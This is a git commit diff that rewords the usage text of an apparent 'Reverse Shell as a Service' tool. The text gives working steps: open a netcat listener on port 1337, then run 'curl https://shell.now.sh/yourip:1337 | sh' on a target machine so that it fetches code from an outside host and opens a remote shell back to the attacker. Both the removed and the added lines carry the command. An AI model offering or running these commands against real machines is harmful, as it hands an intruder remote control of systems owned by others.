83564a207ea1617214f1ece87fcce3af00d3227c
Luke Childs <lukechilds123@gmail.com>
2017-09-14 13:46:25 +0100

    Simplify web instructions

--- src/index.js
+++ src/index.js
@@ -3,11 +3,11 @@
 const usage = `# Reverse Shell as a Service
 # https://github.com/lukechilds/reverse-shell
 #
-# 1. On your machine, open up a port and listen to it with netcat
+# 1. On your machine:
 #      nc -l 1337
 #
-# 2. On the target machine, pipe the output of https://shell.now.sh/yourhostnameorip:port into sh
-#      curl https://shell.now.sh/192.168.0.69:1337 | sh
+# 2. On the target machine:
+#      curl https://shell.now.sh/yourip:1337 | sh
 #
 # 3. Don't be a dick`;
 
